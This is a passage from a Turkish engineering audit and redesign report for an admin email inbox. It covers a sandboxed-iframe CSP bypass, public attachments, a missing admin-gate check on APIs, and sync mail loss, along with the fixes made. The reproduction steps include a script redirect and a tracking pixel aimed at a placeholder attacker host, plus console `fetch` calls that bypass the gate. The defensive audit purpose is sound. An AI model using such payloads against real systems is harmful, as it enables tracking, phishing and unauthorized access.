3. **Atama ve durum (ekip gelen kutusu):** maili bir ekip üyesine ata, durum (Açık/Beklemede/Kapandı), iç not. Front/Help Scout'un ana değeri bu ve mevcut `/admin/ekip` modülüyle görev oluşturma bağlantısı kurulabilir ("Bu mailden görev oluştur").
4. **Gelişmiş filtre ve arama:** okunmamış, bounce, ekli, departman ve tarih aralığı filtreleri; tam metin arama (Postgres `tsvector` üzerinde `subject + bodyText`); kayıtlı görünümler.
5. **Gerçek zamanlı ve şeffaf senkron:** son senkron zamanı + durum, arka plan senkronu (UID artımlı), mümkünse IMAP IDLE ya da Gmail push (Pub/Sub watch) ile yeni mail bildirimi ve kenar çubuğunda okunmamış rozeti.
6. **Hazır yanıtlar ve imza:** stajyerlere sık verilen yanıtlar için şablonlar (mevcut `{{isim}}` değişken altyapısı kullanılabilir), varsayılan imza, ek ile yanıt verme, taslak otomatik kaydı.

---

## Yeniden tasarım vizyonu

**Hedef deneyim:** Kalabalık bir "posta görüntüleyicisi" değil, **stajyer iletişimi için bir triage masası**. Admin sayfayı açtığında üç soruya anında yanıt alabilmeli: "Yanıt bekleyen kim var?", "Hangi görev maili geri döndü/iletilemedi?", "Son senkron sağlıklı mı?". Bunların yanında hızlı, klavyeyle yürüyen ve güvenli bir okuma ve yanıt akışı.

**Yerleşim (masaüstü, üç bölme, Linear/Front deseni):**
- **Sol ray (~200px):** Görünümler. Gelen (okunmamış sayısı) · Stajyerler · Yanıt bekleyen · Yanıtlandı · İletilemedi · Ekli · Arşiv. Her birinde canlı sayaç; mevcut üç stat kartı ve çipler buraya taşınır, tekrar ortadan kalkar.
- **Orta liste (~380px):** Thread bazlı satırlar: gönderen, konu, snippet, mesaj sayısı, ek ikonu, stajyer/departman etiketi, "yanıtlandı" işareti. Üstte arama (debounce'lu, `/` kısayolu) ve "Son senkron · 12 dk önce · Şimdi senkronla" satırı. Cursor tabanlı sonsuz kaydırma.
- **Sağ okuma bölmesi:** Thread akışı (eski mesajlar katlanmış), sanitize edilmiş HTML, "uzak görselleri göster" bandı, ek kartları (önizlenebilir türler için hafif önizleme modalı). Altta sticky yanıt kutusu: alıntı, hazır yanıt seçici, imza. Sağ üstte aksiyonlar: Okunmadı · Arşivle · Ata · Görev oluştur · Gmail'de aç.
- **Mobil:** Görünümler yatay kaydırılan çip şeridi → liste → tam ekran okuma sheet'i (geri jesti, sticky yanıt çubuğu). Stat kartları mobilde kaldırılır.

**Motion (ölçülü):** framer-motion (`m as Motion`) ile yalnızca anlamlı yerlerde:
- Yeni senkronla gelen satırlar için 150 ms yükseklik + opaklık girişi (yalnızca yeni öğeler, `layout` ile).
- Arşivlenen satır için yana kayıp çökme (`AnimatePresence`).
- Okuma bölmesi geçişinde 120 ms crossfade.

Tümü `useReducedMotion` ile kapatılabilir olmalı. Her tuş vuruşunda listeyi yeniden canlandıran mevcut `animate-in` kaldırılmalı. 3B ya da dekoratif motion bu sayfaya uygun değil: iş aracında hız ve okunabilirlik öncelikli.

**Veri ve API değişiklikleri:**
- **Şema:** `InboxMessage`'a `direction` ('in'|'out'), `repliedAt`, `archivedAt`, `assigneeId`, `status`, `bodyHtmlSafe` (sanitize edilmiş), `searchVector` (tsvector, GIN index) ekleyin. `Settings` içinde `inbox_sync_state` = `{ uidValidity, lastUid, lastRunAt, lastError }` tutun.
- **Senkron:** UID artımlı, toplu dedupe, sanitize senkron sırasında; ekler private bucket'a ve tür izin listesine göre disposition.
- **API:**
  - `GET /api/admin/inbox?view=&q=&cursor=` → `{ threads, nextCursor, counts }` (sayaçlar Redis'te 30 sn).
  - `GET /api/admin/inbox/threads/[root]`
  - `PATCH /api/admin/inbox/[id]` (`seen|archived|assignee|status`)
  - `POST /api/admin/inbox/[id]/reply` (References'ı sunucu kurar, giden kaydı yazar, audit log ekler)
  - `GET /api/admin/inbox/[id]/attachments/[n]` (presigned yönlendirme)
- **Yetki:** tüm `/api/admin/*` için gate kontrolü `requireAuth` içinde.
- **İstemci:** SWR (`keepPreviousData`, optimistic `mutate`), roving-tabindex listbox, kısayol hook'u.

---

## Çakışmalar / birleştirme önerisi

- **`/admin/intern-emails` ile güçlü örtüşme:** O sayfa stajyerlere görev maili gönderiyor ve açılma/gönderim durumunu izliyor (`intern-emails/page.tsx:387-430`). Bu sayfa ise aynı stajyerlerin yanıtlarını (`isFromIntern`, `matchedTemplateId`) ve bounce'larını topluyor. İki sayfa tek bir **"Stajyer İletişimi"** modülünün iki sekmesi olmalı: *Gönderilenler* (şablonlar + açılma/teslim/bounce) ve *Gelen kutusu* (yanıtlar). Gönderim satırında "Yanıt geldi → aç", gelen mailde "Bu yanıt şu görev mailine ait → şablona git" çift yönlü bağlantıları kurulmalı. Sayfaları fiziksel olarak birleştirmek zorunlu değil, ama ortak bir alt navigasyon (tab bar) ve paylaşılan durum (bounce/yanıt) olmalı.
- **`/admin/settings` içindeki compose-mail kullanımı:** `compose-mail` ucu settings ekranından (`settings-client.tsx`) da çağrılıyor. Giden mail kaydı ve audit log bu uca eklendiğinde, ayarlardaki "tek seferlik mail" de gelen kutusunun *Gönderilenler* görünümünde listelenebilir. Tek bir giden kayıt modeli iki giriş noktasını da kapsar.
- **`/admin/feedbacks`:** Kullanıcı geri bildirimi de bir "gelen kutusu" deseni ama veri kaynağı ve kitlesi farklı; birleştirme önerilmez. Liste/okuma/triage bileşenleri (listbox, okuma bölmesi, kısayollar) ortak bir `components/inbox/` paketi olarak iki sayfada paylaşılabilir.
- **Kaldırma önerilmez:** Sayfa benzersiz bir işlevi (IMAP gelen kutusu) karşılıyor ve kullanılıyor.

---

## Doğrulama (şüpheci inceleme)

Dört KRİTİK/YÜKSEK iddia, kod baştan okunarak çürütülmeye çalışıldı. Kod çalıştırılmadı, DB'ye dokunulmadı, tarayıcıda denenmedi.

### 1. HTML mail CSP enjeksiyonunun atlatılması — **DOĞRULANDI** (önem: YÜKSEK değil, ORTA)

- `app/admin/inbox/page.tsx:431`: `/<head[^>]*>/i` deseni `<header>` (ve `<headline>` gibi `head` ile başlayan her etiket) ile de eşleşir. Gerçek `<head>` yokken meta `<header>`'ın içine, yani body'ye yazılır. HTML spesifikasyonuna göre `http-equiv="Content-Security-Policy"` meta'sı `head`'in çocuğu değilse yok sayılır. Bu durumda politika hiç uygulanmaz.
- Regex'ten bağımsız, kodun kendi güvenlik iddiasını (`:422-425` "harici hiçbir istek yapılamaz") bozan iki yol daha var:
  - **`<head>`'den önce gelen script:** `<script>…</script><html><head>…` biçimindeki bir gövdede parser script'i örtük oluşturduğu head'e koyar ve meta'dan ÖNCE çalıştırır. Meta CSP yalnızca kendisinden sonraki içeriğe uygulanır.
  - **Doğru yerleşse bile:** `script-src 'unsafe-inline'` (`:428`) gönderenin inline script'ine de izin verir. CSP'de navigasyon direktifi yoktur. `sandbox="allow-scripts"` (`:334`) de çerçevenin kendi kendini gezdirmesini engellemez. Dolayısıyla `location='https://saldirgan/?t='+Date.now()` çalışır: admin'in IP'si ve okuma anı dışarı sızar, yeni belgede CSP de olmaz.
- **Yeniden üretim:** Dışarıdan biri `qratex.co@gmail.com` adresine `<html><body><header><img src="https://saldirgan/p.gif"></header>…</body></html>` gövdeli bir mail atar. Senkronda `bodyHtml` ham olarak saklanır (`lib/mail-inbox.ts:94`, temizlik yok). Admin maili açınca piksel yüklenir. Alternatif olarak çerçeve saldırganın sayfasına gider ve iframe içinde sahte bir "oturum süresi doldu" ekranı gösterir.
- **Sınır:** `allow-same-origin` yok, iframe opak origin'de çalışır. qratex çerezlerine, parent DOM'a ve admin API'lerine erişim **yok**. `parent.postMessage` yalnızca sınırlı bir yükseklik değeri taşır (`:66-73`, viewport'un %85'iyle sınırlı). Gerçek etki okunma takibi, IP sızıntısı ve çerçeve içi oltalamayla sınırlı.
- **Öneri:** Güvenliği meta enjeksiyonuna bırakmayın. Senkron sırasında sunucuda `sanitize-html` ya da DOMPurify (jsdom) ile `script`, `on*`, `meta`, `base`, `form`, `iframe` ve `object` temizlensin ve sonuç `bodyHtmlSafe` olarak saklansın. Gövde temizlendiği için, yükseklik ölçümü için gereken tek script, temizlikten sonra eklenen bizim script'imiz olur. Daha sıkı seçenek iframe'i `sandbox=""` (script yok) ile açıp yüksekliği "genişlet" düğmesine bırakmaktır; opak origin'de parent içeriği ölçemez. Uzak görseller varsayılan olarak `data-src`'ye çevrilsin, "Uzak görselleri göster" bandıyla bir görsel proxy'si üzerinden açılsın.

### 2. Gelen ekler public ve inline: HTML/SVG eki çalıştırılabilir içerik — **ÇÜRÜTÜLDÜ** (iddia edilen KRİTİK/YÜKSEK etki için; ORTA düzeyde bir gizlilik sertleştirmesi kalıyor)

- Mekanizma doğru: `lib/mail-inbox.ts:122-133` gönderenden gelen `contentType` ile her türü `inline` disposition'la yüklüyor. `lib/r2-storage.ts:58-63` public URL döndürüyor. `attachment-backfill/route.ts:24-28` yalnızca görsel, video ve PDF'i inline yapıyor; ingest yolu bu ayrımı yapmıyor.
- Ama iddianın ağırlığını taşıyan "uygulama alt alan adı" koşulu sağlanmıyor. Yerel `.env`'deki `R2_PUBLIC_URL` değeri `https://pub-….r2.dev` (yalnızca host okundu). Bu adres qratex'ten **farklı bir site**: qratex çerezleri buraya gitmez, `SameSite=Lax` CSRF yolu da açılmaz. Bir HTML eki çalışsa bile ancak kendi r2.dev origin'inde çalışır. Saldırgan aynı oltalama sayfasını zaten kendi alanında barındırabilir, yani bu yol ek bir yetenek kazandırmıyor. (Vercel prod ortamındaki değer ayrıca doğrulanmadı. `.env` canlı kaynaklara bağlı olduğundan aynı olması kuvvetle muhtemel. Prod'da `*.qratex.*` bir özel alan kullanılıyorsa bu karar yeniden değerlendirilmeli.)
- "Kimlik doğrulamasız, süresiz URL" kısmı doğru. Ancak anahtar `inbox/<uid>-<Date.now() ms>-<dosya adı>` biçiminde, yani tahmini pratikte zor bir capability URL. Somut sızıntı ancak URL'nin başka yoldan ele geçmesiyle olur (link `rel="noreferrer"`, `page.tsx:315`).
- **Yine de yapılması gereken (ORTA):** KVKK açısından stajyer belgeleri public kovada durmamalı. Ekler private bucket'a ya da ayrı bir öneke taşınmalı ve `GET /api/admin/inbox/[id]/attachments/[n]` üzerinden admin yetkisi kontrol edilip kısa ömürlü presigned URL'ye yönlendirilmeli. Disposition, MIME izin listesine göre verilmeli: görsel (SVG hariç), PDF ve video `inline`, geri kalan her şey (`text/html`, `image/svg+xml`, `application/xhtml+xml` dahil) `attachment` ve `application/octet-stream`.

### 3. Admin API uçlarında gizli kapı kontrolü yok — **DOĞRULANDI** (sistem geneli, savunma katmanı açığı)

- `proxy.ts:105-119`: `/api/*` istekleri `authMiddleware`'e hiç girmez, yalnızca başlık eklenir. Gate kontrolü (`proxy.ts:79-88`) yalnızca sayfa yollarında çalışıyor.
- `lib/api-auth.ts:52-80` `requireAuth` yalnızca rolü ve token replay'i kontrol ediyor. `verifyGateCookie` (`lib/admin-gate.ts`) hiçbir API rotasında çağrılmıyor: grep'te `admin_gate`/`gateCookieBelongsTo` yalnızca `proxy.ts`, `lib/admin-gate.ts` ve `lib/admin-gate-edge.ts`'te çıkıyor.
- `app/api/admin/inbox/route.ts:16,57,80`, `app/api/admin/inbox/[id]/route.ts:12` ve `app/api/admin/compose-mail/route.ts` (`requireAuth(['ADMIN'])`) gate'e bakmıyor.
- **Yeniden üretim:** Rolü ADMIN yapılmış ama gate cevabını bilmeyen bir kullanıcı giriş yapar. `/admin/inbox`'a gidince `/admin-gate`'e yönlendirilir. Ama aynı oturum çereziyle tarayıcı konsolundan `fetch('/api/admin/inbox')` → 200 ve mail listesi döner. `fetch('/api/admin/inbox/<id>')` → tam gövde döner (ve mail `seen=true` olur). `POST /api/admin/compose-mail` → şirket adresinden mail gider.
- **Sınır:** Önkoşul, oturumda ADMIN rolü. Bu sıradan kullanıcı için bir yetki atlatması değil. Ama gate'in kendi tehdit modelini ("rolü kazara/kötü niyetle ADMIN yapılan stajyer", `lib/admin-gate.ts:1-9`, `proxy.ts:76-78`) tamamen boşa çıkarıyor.
- **Öneri:** `requireAuth` içine, rol listesinde `ADMIN` varsa `cookies()`'ten `admin_gate`'i okuyup `verifyGateCookie(userId, güncelCevap)` ile doğrulayan bir adım eklenmeli. Cevap Redis'te kısa TTL ile önbelleğe alınabilir. Doğrulama başarısızsa `403 { error: 'gate_required' }` dönmeli. Alternatif olarak `proxy.ts`'te `/api/admin/*` için edge tarafında `gateCookieBelongsTo` kontrolü yapılabilir; cron gibi bearer'lı uçlar muaf tutulmalı. İstemci `gate_required` aldığında `/admin-gate?from=` adresine yönlendirmeli.

### 4. Senkron penceresi son 40 mail: mail kaybı — **DOĞRULANDI**

- `lib/mail-inbox.ts:64-69`: her senkron, sıra numarasına göre yalnızca `total-limit+1:*` aralığını çeker. Kalıcı bir "son UID" imleci yok. Cron günde bir kez çalışıyor (`vercel.json:7` `0 3 * * *` → `cron/daily/route.ts:54` → `cron/inbox-sync/route.ts:35` `syncInbox(40)`). Manuel "Yenile" de 40 ile sınırlı (`page.tsx:107`; API üst sınırı 100, `inbox/route.ts:70`).
- **Yeniden üretim:** İki senkron arasında INBOX'a 41 veya daha fazla mail düşer. Örneğin `/admin/intern-emails`'ten toplu görev maili sonrası gelen otomatik yanıtlar, bounce'lar, stajyer yanıtları ve servis bildirimleri. Bir sonraki senkron yalnızca son 40'ı alır. En eski fazlalık hiçbir zaman çekilmez: sonraki senkronlar da yalnızca en yeni 40'a bakar. Stajyer yanıtı Gmail'de durur ama panelde ve `isFromIntern` eşleşmesinde görünmez. Hata ya da uyarı da yok. Ayrıca mail senkrondan önce Gmail'de arşivlenirse INBOX'tan çıkar ve hiç çekilmez.
- **UIDVALIDITY:** Şemada benzersizlik yalnızca `@@unique([mailbox, uid])` (`prisma/schema.prisma:966`). `uidValidity` saklanmıyor. UIDVALIDITY değişirse yeni maillerin UID'leri eski kayıtlarla çakışır ve `exists` kontrolünde (`lib/mail-inbox.ts:76-78`) atlanır. Gmail'de nadir görülen ama kodda korunmayan bir durum.
- **Öneri:** `Settings.inbox_sync_state = { uidValidity, lastUid }` tutulmalı ve `client.fetch({ uid: `${lastUid+1}:*` }, …, { uid: true })` ile UID artımlı çekilmeli. UIDVALIDITY değişince tam yeniden tarama yapılmalı ve şemaya `uidValidity` eklenerek unique `[mailbox, uidValidity, uid]` olmalı. Tek koşunun 60 sn bütçesini aşmamak için koşu başına üst sınır konulmalı ve imleç ilerletilmeli, böylece birikmiş mailler sonraki koşularda kaybolmadan çekilir. Cron sıklığı da artırılmalı (harici cron-job.org ile saatlik `inbox-sync`). `fetched == limit` durumunda durum paneline "pencere doldu, eksik olabilir" uyarısı yazılmalı.


---

## Uygulama (Dalga 2)

Sayfa yeniden yazıldı: ince sunucu `page.tsx` (sayaçlar + senkron durumu + ilk liste sayfası sunucuda, `?view=&q=&id=` derin bağlantı) → istemci adası `components/admin/a-iletisim/inbox/*` (QDL v2 `PanelPage`/`PageHeader`/`QueryState`, ops kaydı). İş kuralları `lib/mail-center/inbox.server.ts` + saf yardımcılar `lib/mail-center/mail-html.ts`; senkron `lib/mail-inbox.ts` (UID artımlı). Tüm uçlar `defineRoute` (ADMIN + kapı + zod + hız sınırı): `GET /api/admin/inbox`, `GET …/overview`, `POST …/sync`, `PUT …/settings`, `GET|PATCH|DELETE …/[id]`, `GET …/[id]/body`, `GET …/[id]/attachments/[n]`, `POST …/[id]/reply`. Şema değişmedi: arşiv ve giden yanıt mevcut `InboxMessage.mailbox` alanıyla ifade edilir (`INBOX` / `INBOX_ARCHIVED` / `QRATEX_SENT`), senkron imleci ve saklama süresi `Settings`'te. Testler: `__tests__/lib/mail-center-html.test.ts`, `__tests__/lib/mail-center-inbox.test.ts`.

### Özellik envanteri — yeni durum

| # | Özellik | Yeni durum | Not |
|---|---|---|---|
| 1 | Hero başlık + açıklama | ÇALIŞIYOR | Hesap adresi sabit değil, env'den (`inboxAccount()`). |
| 2 | IMAP yapılandırma uyarısı | ÇALIŞIYOR | Bant + senkron düğmesi devre dışı. |
| 3 | Stat: Toplam | ÇALIŞIYOR | Üç stat kartı kaldırıldı; sayılar görünüm rayında tek yerde (tekrar yok). |
| 4 | Stat: Stajyerden | ÇALIŞIYOR | "Stajyerler" görünümü sayacı. |
| 5 | Stat: Okunmadı | ÇALIŞIYOR | Sunucu sayacı + iyimser güncelleme; çift düşürme yarışı yok (sayaç sunucudan tazelenir). |
| 6 | Arama | ÇALIŞIYOR | 250 ms debounce, istek iptali (AbortSignal), `keepPreviousData` (titreme yok); gövde önizlemesi, alıcı, departman da aranır; `/` kısayolu; etiketli. |
| 7 | Senkron | ÇALIŞIYOR | UID artımlı imleç, parti + süre bütçesi, `hasMore` ile "Devam et"; kaydedilemeyen mail imleci durdurur. |
| 8 | Filtre: Tümü | ÇALIŞIYOR | "Gelen" görünümü. |
| 9 | Filtre: Stajyerler | ÇALIŞIYOR | |
| 10 | "X okunmadı" etiketi | ÇALIŞIYOR | Gerçek "Okunmamış" görünümüne dönüştü (tıklanır, sayaçlı). |
| 11 | Liste iskeleti | ÇALIŞIYOR | Yalnız ilk yüklemede; aramada önceki sonuç kalır. |
| 12 | Boş durum | ÇALIŞIYOR | Hata artık boş liste gibi görünmez (`QueryState` hata + Tekrar dene); görünüme/aramaya özel boş metin. |
| 13 | Liste öğesi | ÇALIŞIYOR | Tarih: bugün saat / bu yıl "12 Eki" / eski yıl "12.10.2025" (İstanbul). |
| 14 | Okunmadı noktası | ÇALIŞIYOR | `sr-only` "Okunmadı". |
| 15 | Bounce rozeti | ÇALIŞIYOR | Emoji yerine lucide ikon + metin; ayrıca "İletilemedi" görünümü. |
| 16 | Thread sayısı | ÇALIŞIYOR | Sayım sunucuda tüm kutular üzerinden (`groupBy threadRoot`), giden yanıtlar dahil; References zinciri artık doğru (kök kaymıyor). |
| 17 | Stajyer eşleşme rozeti | ÇALIŞIYOR | |
| 18 | Sayfalama | ÇALIŞIYOR | `(sentAt,id)` imleçli, sonsuz kaydırma + "Daha fazla yükle" yedeği, "Listenin sonu" işareti, `matched` toplamı. |
| 19 | Mail açma | ÇALIŞIYOR | GET yan etkisiz; okundu işaretlemesi açık PATCH; yarış yok (sorgu anahtarı = id); hata kartı + Tekrar dene (sonsuz spinner yok); açılınca odak başlığa. |
| 20 | Mobil liste ↔ detay | ÇALIŞIYOR | Tam genişlik okuma; geri dönüşte odak satıra. |
| 21 | Detay başlığı | ÇALIŞIYOR | Kime (`toEmail`) de gösteriliyor. |
| 22 | Görev alıcısı rozeti | ÇALIŞIYOR | + "Bu stajyere giden görev şablonunu aç" (`/admin/intern-emails?t=`). |
| 23 | Ekler | ÇALIŞIYOR | Yetkili uçtan akış (public URL istemciye verilmez); yalnız güvenli türler `inline`, HTML/SVG/XHTML ve diğerleri `attachment` + octet-stream + nosniff + CSP sandbox; senkron da aynı izin listesini kullanır. |
| 24 | HTML gövde | ÇALIŞIYOR | HTTP başlıklı CSP (işaretlemeyle atlatılamaz), yalnız kendi yükseklik betiğimizin SHA-256'sı, sunucuda script/meta/base/iframe/form/on*/javascript: ayıklama, linkler yeni sekmede. |
| 25 | iframe otomatik yükseklik | ÇALIŞIYOR | `postMessage` kaynağı doğrulanıyor. |
| 26 | Düz metin yedeği | ÇALIŞIYOR | |
| 27 | "İstemcide aç" (mailto) | ÇALIŞIYOR | "Re: Re:" yok (`replySubject`). |
| 28 | Uygulama içi Yanıtla | ÇALIŞIYOR | Alıcı/konu/In-Reply-To/References sunucuda kurulur; konu 200'e kırpılır (İngilizce zod hatası yok); alıntı seçeneği; sade kişisel yanıt şablonu; giden kayıt (`QRATEX_SENT`) thread'de görünür; denetim kaydı; Idempotency-Key. |
| 29 | Yanıt "Vazgeç" | ÇALIŞIYOR | Dolu taslakta onay (`ConfirmAction`). |
| 30 | Okunmadı işaretle | ÇALIŞIYOR | Düğme + `u` kısayolu; PATCH hatası yutulmuyor. |
| 31 | Arşivle / sil | ÇALIŞIYOR | Arşiv (geri alınabilir, "Geri al" toast'ı) + kalıcı silme (onaylı, ekler depodan da silinir, denetimli). Gmail'e yansıtma yok (bilinçli; metinde söyleniyor). Spam işaretleme KALDIRILDI: Gmail'e yazma yetkisi/akışı yok, yapılmayacak işi göstermemek için. |
| 32 | Son senkron zamanı | ÇALIŞIYOR | Başlıkta "Son senkron · x önce · elle/otomatik", hata kırmızı, bekleyen mail uyarısı. |
| 33 | Otomatik senkron | ÇALIŞIYOR | Cron artık imleçten devam ediyor (mail kaybı yok); sıklık günlük orkestratöre bağlı (aşağıda kalan açık). |
| 34 | Okunmamış/bounce/ekli filtresi | ÇALIŞIYOR | + Yanıt bekleyen, Gönderilen, Arşiv görünümleri. |
| 35 | Yetki | ÇALIŞIYOR | Admin kapısı artık `requireAuth` içinde (güvenlik dalgası); tüm uçlar `defineRoute`. |
| 36 | Senkron hız sınırı | ÇALIŞIYOR | Kullanıcı başına dakikada 6. |
| 37 | Boş okuma paneli | ÇALIŞIYOR | Kısayol ipucuyla. |
| 38 | Klavye gezintisi | ÇALIŞIYOR | `j/k` gezin, `r` yanıtla, `e` arşiv, `u` okunmadı, `/` ara, `Esc` kapat; diyalog açıkken ve yazarken devre dışı. |
| 39 | Konuşma görünümü | ÇALIŞIYOR | Okuma bölmesinde konuşmanın tamamı (gelen + giden), eskiler katlanır. |
| 40 | Şablona bağ ("yanıt geldi") | ÇALIŞIYOR | Gelen mailden şablona bağlantı; şablon sayfası alıcı bazında yanıt sayısı + "gelen kutusunda aç". |
| 41 | Saklama süresi / KVKK | ÇALIŞIYOR | Admin seçer (kapalı/90/180/365/730 gün, varsayılan kapalı, denetimli); `cron/inbox-sync` süresi dolanları ve eklerini siler. |
| 42 | Okuma/yanıt denetim kaydı | ÇALIŞIYOR | Yanıt, arşiv, silme, saklama ayarı denetime yazılır. (Salt okuma denetlenmez: gürültü; gerekirse ayrı karar.) |

**Sayım:** 42 satır · 42 ÇALIŞIYOR (spam alt özelliği kaldırıldı, gerekçesi #31'de).

### Kapanan bulgular
1 (CSP atlatma) · 2 (ek sunumu) · 3 (API kapısı — global düzeltme, burada `defineRoute` ile doğrulandı) · 4 (References zinciri) · 5 (40 mail penceresi + N+1) · 6 (yarışlar, sonsuz spinner) · 7 (yutulan hatalar) · 8 (konu sınırı, giden kayıt, denetim, alıntı) · 9 (sayfalama, sayaç tutarlılığı) · 10 (ölü veri: durum gösteriliyor, PATCH bağlı, `matchedTemplateId` kullanılıyor) · 11 (erişilebilirlik) · 12 (mobil + hareket: `useMotionPolicy`, yalnız eklenen/çıkan satır animasyonu, azaltılmış harekette statik) · 13 (uzak görsel bandı + yeni sekme linkler) · 14 (saklama) · 15 (iki sayfa arası yerel sekme + çift yönlü bağlantı) · 16 (küçük tutarlılık: "Re: Re:", yıl, emoji, Prisma tipleri, GET yan etkisi, postMessage kaynağı, Türkçe IMAP hataları).

### Kalanlar
- **UIDVALIDITY değişimi:** şema `[mailbox, uid]` benzersizliğinde kaldığı için UIDVALIDITY değişince Message-ID ile dedupe edilir; eski bir UID ile çakışan yeni mail `P2002` alıp imleci durdurur ve hata durumda görünür (sessiz kayıp yok). Kalıcı çözüm için **ŞEMA İSTEĞİ:** `InboxMessage.uidValidity String?` + benzersizlik `[mailbox, uidValidity, uid]`.
- **Uzak görsel vekili (IP gizleme):** "Görselleri göster" doğrudan yükler; kullanıcıya IP'nin görünebileceği açıkça yazılıyor. Vekil uç ayrı iş.
- **Senkron sıklığı:** cron günlük orkestratörde (`app/api/cron/daily/jobs.ts`, sahiplik dışı). İmleç sayesinde harici zamanlayıcı (cron-job.org) `GET /api/cron/inbox-sync`'i saatlik çağırabilir; kurulumu operasyon işi.
- **R2 kovası hâlâ public:** ekler artık yetkili uçtan akıyor ve URL istemciye verilmiyor, ama eski nesnelerin kovası public. Özel kovaya taşıma altyapı işi.
- **Atama/durum (ekip gelen kutusu), hazır yanıtlar/imza, tam metin arama (tsvector):** şema/ürün kararı gerektiriyor; bu dalgada yapılmadı.
